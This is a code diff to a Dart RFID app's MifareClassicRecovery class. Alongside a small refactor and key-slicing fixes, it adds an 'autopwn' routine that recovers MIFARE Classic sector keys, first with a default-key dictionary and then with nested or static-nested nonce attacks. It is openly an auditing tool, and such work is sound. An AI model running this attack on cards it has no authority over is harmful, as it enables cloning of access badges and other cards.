@@ -142,16 +142,19 @@ class MifareClassicRecovery {
         }
       }
 
-      // Key check part competed, checking found keys
-      allKeysExists = true;
-      for (var sector = 0;
-          sector < mfClassicGetSectorCount(mf1Type);
-          sector++) {
-        for (var keyType = 0; keyType < 2; keyType++) {
-          if (checkMarks[sector + (keyType * 40)] !=
-              ChameleonKeyCheckmark.found) {
-            allKeysExists = false;
-          }
+      checkComplete(mf1Type);
+    }
+  }
+
+  // Key check part competed, checking found keys
+  void checkComplete(MifareClassicType type) {
+    allKeysExists = true;
+    for (var sector = 0; sector < mfClassicGetSectorCount(type); sector++) {
+      for (var keyType = 0; keyType < 2; keyType++) {
+        if (checkMarks[sector + (keyType * 40)] !=
+            ChameleonKeyCheckmark.found) {
+          checkMarks[sector + (keyType * 40)] = ChameleonKeyCheckmark.none;
+          allKeysExists = false;
         }
       }
     }
@@ -322,7 +325,7 @@ class MifareClassicRecovery {
                 appState.log!.d("Found keys: $keys. Checking them...");
 
                 for (var key in keys) {
-                  var keyBytes = u64ToBytes(key);
+                  var keyBytes = u64ToBytes(key).sublist(2, 8);
                   if ((await appState.communicator!.mf1Auth(
                       mfClassicGetSectorTrailerBlockBySector(sector),
                       0x60 + keyType,
@@ -330,7 +333,7 @@ class MifareClassicRecovery {
                     appState.log!.i(
                         "Found valid key! Key ${bytesToHex(keyBytes.sublist(2, 8))}");
                     found = true;
-                    validKeys[sector + (keyType * 40)] = keyBytes.sublist(2, 8);
+                    validKeys[sector + (keyType * 40)] = keyBytes;
                     checkMarks[sector + (keyType * 40)] =
                         ChameleonKeyCheckmark.found;
                     await recheckKey(keyBytes);
@@ -427,6 +430,189 @@ class MifareClassicRecovery {
           break;
         }
       }
+    }
+  }
+
+  Future<void> autopwn() async {
+    appState.log!.i("Autopwn started");
+
+    if (!await appState.communicator!.isReaderDeviceMode()) {
+      await appState.communicator!.setReaderDeviceMode(true);
+    }
+
+    var card = await appState.communicator!.scan14443aTag();
+    var mifare = await appState.communicator!.detectMf1Support();
+    var mf1Type = MifareClassicType.none;
+    error = "";
+
+    if (!mifare) {
+      error = "not_mifare_classic";
+      return;
+    }
+
+    if (mifare) {
+      mf1Type = mfClassicGetType(card.atqa, card.sak);
+      var prng = await appState.communicator!.getMf1NTLevel();
+
+      // TODO: check if magic card
+      // those can be recovered via magic commands
+
+      bool hasKey = false;
+      var validKey = Uint8List(0);
+      var validKeyBlock = 0;
+      var validKeyType = 0;
+
+      // try to get 1 valid key
+      for (var sector = 0;
+          sector < mfClassicGetSectorCount(mf1Type);
+          sector++) {
+        for (var keyType = 0; keyType < 2; keyType++) {
+          if (hasKey) break;
+          if (checkMarks[sector + (keyType * 40)] ==
+              ChameleonKeyCheckmark.none) {
+            checkMarks[sector + (keyType * 40)] =
+                ChameleonKeyCheckmark.checking;
+            update();
+          } else if (checkMarks[sector + (keyType * 40)] ==
+              ChameleonKeyCheckmark.found) {
+            hasKey = true;
+            validKey = validKeys[sector + (keyType * 40)];
+            validKeyBlock = mfClassicGetSectorTrailerBlockBySector(sector);
+            validKeyType = keyType;
+            break;
+          }
+          for (var key in [
+            ...gMifareClassicKeys,
+          ]) {
+            appState.log!.i(
+                "DICT: Checking ${bytesToHex(key)} on sector $sector, key type $keyType");
+
+            if (await appState.communicator!.mf1Auth(
+                mfClassicGetSectorTrailerBlockBySector(sector),
+                0x60 + keyType,
+                key)) {
+              // Found valid key
+              appState.log!.i("DICT: Found valid key! Key ${bytesToHex(key)}");
+              validKeys[sector + (keyType * 40)] = key;
+              checkMarks[sector + (keyType * 40)] = ChameleonKeyCheckmark.found;
+              update();
+
+              await recheckKey(key);
+              hasKey = true;
+              validKey = key;
+              validKeyBlock = mfClassicGetSectorTrailerBlockBySector(sector);
+              validKeyType = keyType;
+              break;
+            }
+          }
+        }
+      }
+
+      if (!hasKey) {
+        error = "Default dictionary attack failed";
+        return;
+      }
+
+      appState.log!.i(
+          "nested canidate valid key: ${bytesToHex(validKey)}, block: $validKeyBlock, keyType: ${validKeyType == 0 ? "A" : "B"}");
+
+      // we got 1 valid key. recover the rest via nested attack
+      for (var sector = 0;
+          sector < mfClassicGetSectorCount(mf1Type);
+          sector++) {
+        for (var keyType = 0; keyType < 2; keyType++) {
+          if (checkMarks[sector + (keyType * 40)] ==
+              ChameleonKeyCheckmark.found) {
+            continue;
+          } else if (checkMarks[sector + (keyType * 40)] ==
+              ChameleonKeyCheckmark.none) {
+            checkMarks[sector + (keyType * 40)] =
+                ChameleonKeyCheckmark.checking;
+
+            update();
+
+            var distance = await appState.communicator!
+                .getMf1NTDistance(validKeyBlock, 0x60 + validKeyType, validKey);
+            List<int> keys = [];
+            if (prng == NTLevel.weak) {
+              var nonces = await appState.communicator!.getMf1NestedNonces(
+                  validKeyBlock,
+                  0x60 + validKeyType,
+                  validKey,
+                  mfClassicGetSectorTrailerBlockBySector(sector),
+                  0x60 + keyType);
+              var nested = NestedDart(
+                  uid: distance.uid,
+                  distance: distance.distance,
+                  nt0: nonces.nonces[0].nt,
+                  nt0Enc: nonces.nonces[0].ntEnc,
+                  par0: nonces.nonces[0].parity,
+                  nt1: nonces.nonces[1].nt,
+                  nt1Enc: nonces.nonces[1].ntEnc,
+                  par1: nonces.nonces[1].parity);
+              keys = await recovery.nested(nested);
+            } else if (prng == NTLevel.static) {
+              var nonces = await appState.communicator!.getMf1NestedNonces(
+                  validKeyBlock,
+                  0x60 + validKeyType,
+                  validKey,
+                  mfClassicGetSectorTrailerBlockBySector(sector),
+                  0x60 + keyType,
+                  isStaticNested: true);
+              var nested = StaticNestedDart(
+                uid: distance.uid,
+                keyType: 0x60 + validKeyType,
+                nt0: nonces.nonces[0].nt,
+                nt0Enc: nonces.nonces[0].ntEnc,
+                nt1: nonces.nonces[1].nt,
+                nt1Enc: nonces.nonces[1].ntEnc,
+              );
+
+              keys = await recovery.staticNested(nested);
+            } else if (prng == NTLevel.hard) {
+              // No hardnested
+              error = "This card is not vulnerable for attacks (yet)";
+              checkMarks[sector + (keyType * 40)] = ChameleonKeyCheckmark.none;
+              return;
+            }
+
+            if (keys.isNotEmpty) {
+              for (var key in keys) {
+                var keyBytes = u64ToBytes(key).sublist(2, 8);
+                if ((await appState.communicator!.mf1Auth(
+                    mfClassicGetSectorTrailerBlockBySector(sector),
+                    0x60 + keyType,
+                    keyBytes))) {
+                  appState.log!.i(
+                      "NESTED: Found valid key! Key ${bytesToHex(keyBytes)}");
+                  validKeys[sector + (keyType * 40)] = keyBytes;
+                  checkMarks[sector + (keyType * 40)] =
+                      ChameleonKeyCheckmark.found;
+                  await recheckKey(keyBytes);
+
+                  break;
+                } else {
+                  // if latest key.
+                  if (key == keys.last) {
+                    checkMarks[sector + (keyType * 40)] =
+                        ChameleonKeyCheckmark.none;
+                    update();
+                  }
+                }
+              }
+            } else {
+              error = "nested failed";
+              return;
+            }
+            update();
+          }
+        }
+      }
+
+      // Key check part competed, checking found keys
+      checkComplete(mf1Type);
+
+      return;
     }
   }
 }
